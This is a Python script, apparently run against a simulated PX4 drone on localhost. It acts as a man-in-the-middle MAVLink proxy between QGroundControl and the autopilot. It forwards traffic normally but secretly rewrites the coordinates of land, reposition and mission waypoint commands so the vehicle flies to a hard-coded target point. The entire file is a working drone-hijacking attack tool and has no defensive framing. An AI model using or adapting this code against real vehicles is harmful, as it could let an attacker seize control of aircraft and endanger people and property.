import time
from pymavlink import mavutil

class MavlinkHijacker:
    def __init__(self):
        # --- TARGET SETTINGS ---
        self.target_lat = int(47.397354 * 1e7)  
        self.target_lon = int(8.547104 * 1e7)
        self.target_alt = 0.0                   

        # --- NETWORK SETUP ---
        print("🔌 Binding to QGC on UDP 14550...")
        self.qgc_conn = mavutil.mavlink_connection('udpin:127.0.0.1:14550')

        print("🚁 Connecting to PX4 on UDP 14580...")
        self.px4_conn = mavutil.mavlink_connection('udpout:127.0.0.1:14580')
        
        self.is_hijacking = False

    def run(self):
        print("🛡️ MAVLink Proxy Active. Waiting for heartbeat...")
        
        while True:
            # 1. READ FROM QGC -> MODIFY -> FORWARD TO PX4
            msg_qgc = self.qgc_conn.recv_match(blocking=False)
            if msg_qgc:
                msg_type = msg_qgc.get_type()
                
                if msg_type not in ['HEARTBEAT', 'BAD_DATA']:
                    if msg_type == 'COMMAND_INT':
                        if msg_qgc.command in [21, 192]: 
                            print(f"🚨 INTERCEPTED COMMAND: {msg_qgc.command}. Rewriting coordinates!")
                            msg_qgc.x = self.target_lat
                            msg_qgc.y = self.target_lon
                            msg_qgc.z = self.target_alt
                            self.is_hijacking = True

                    elif msg_type == 'MISSION_ITEM_INT':
                        print(f"🚨 INTERCEPTED MISSION ITEM {msg_qgc.seq}. Rewriting coordinates!")
                        msg_qgc.x = self.target_lat
                        msg_qgc.y = self.target_lon
                        self.is_hijacking = True

                self.px4_conn.mav.send(msg_qgc)

            # 2. READ FROM PX4 -> FORWARD TO QGC
            msg_px4 = self.px4_conn.recv_match(blocking=False)
            if msg_px4:
                self.qgc_conn.mav.send(msg_px4)

            time.sleep(0.001) 

# --- ROS2 ENTRY POINT ---
def main(args=None):
    hijacker = MavlinkHijacker()
    try:
        hijacker.run()
    except KeyboardInterrupt:
        print("\n🛑 Shutting down proxy.")

if __name__ == '__main__':
    main()